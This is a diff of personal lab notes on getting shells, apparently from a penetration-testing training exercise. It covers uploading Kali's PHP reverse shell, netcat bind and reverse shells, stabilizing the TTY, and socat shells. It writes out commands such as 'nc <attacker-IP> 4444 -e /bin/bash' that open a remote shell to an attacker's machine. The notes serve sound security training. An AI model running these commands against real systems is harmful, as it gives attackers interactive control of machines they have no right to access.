@@ -369,19 +369,69 @@ The syntax for this is as follows:
 
 ## **Practice & Examples**
 
-1) Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
-2) Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
+1) Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell // Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
 
-Direct to the kali pre-installed webshell directory and edit the file php-reverse-shell.php, change the IP to your local into IP add and rename to rshell.php:
-![[Pasted image 20240820053521.png]]
+	Direct to the kali pre-installed webshell directory and edit the file php-reverse-shell.php, change the IP to your local into IP add and rename to rshell.php:
+	![[Pasted image 20240820053521.png]]
 
-Visting the target machine and submit the shell:
-![[Pasted image 20240820053603.png]]
+	Visting the target machine and submit the shell:
+	![[Pasted image 20240820053603.png]]
 
-Start listening on the attacking machine:
-![[Pasted image 20240820053634.png]]
+	Start listening on the attacking machine:
+	![[Pasted image 20240820053634.png]]
 
 stabilize the netcat:
 1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` 
 2. `export TERM=xterm`
 3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`
+
+
+2)  Experiment with bind and reverse netcat shells.
+
+	### **Bind Shell:**
+	- **Concept**: In a bind shell, the target machine opens a specific port and listens for incoming connections. The attacker then connects to this open port to gain access to the command line on the target machine.
+
+	- **Process**:
+    1. The target machine runs a command to bind a shell to a specific port.
+    2. The attacker connects to the target machine's IP address on that port.
+    3. Once connected, the attacker can execute commands on the target machine through the shell.
+    
+- **Example Command**:
+    `nc -lvp 4444 -e /bin/bash`
+    
+    Here, `nc` (netcat) listens on port `4444` and executes `/bin/bash` when a connection is established.
+
+	### **Reverse Shell:**
+	- **Concept**: In a reverse shell, the target machine initiates a connection back to the attacker's machine. The attacker then gains access to the command line on the target machine through this connection.
+
+	- **Process**:
+    1. The attacker sets up a listener on their own machine, waiting for incoming connections.
+    2. The target machine runs a command to initiate a connection to the attacker's IP address and port.
+    3. Once connected, the attacker can execute commands on the target machine through the shell.
+    
+- **Example Command**:
+    `nc <attacker-IP> 4444 -e /bin/bash`
+    
+    Here, the target machine connects to the attacker's machine at `<attacker-IP>` on port `4444` and executes `/bin/bash` when the connection is established.
+
+
+	 ssh connect to linux machine -> setting netcat listener on port 1234 -> reverse shell using 
+	 `nc <machine-IP> <Port> -e /bin/bash`
+ 
+	![[Pasted image 20240820193640.png]]
+	![[Pasted image 20240820193754.png]]
+
+	reverse shell using special command(with pipes):
+	![[Pasted image 20240820194307.png]]
+	![[Pasted image 20240820194336.png]]
+
+3) Reverse and bind shells using Socat on the Linux machine.
+	 ![[Pasted image 20240820200847.png]]
+	![[Pasted image 20240820200922.png]]
+
+using special command (fully stable Linux tty reverse shell)
+	![[Pasted image 20240820203805.png]]
+	![[Pasted image 20240820203824.png]]
+
+
+4) Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques.
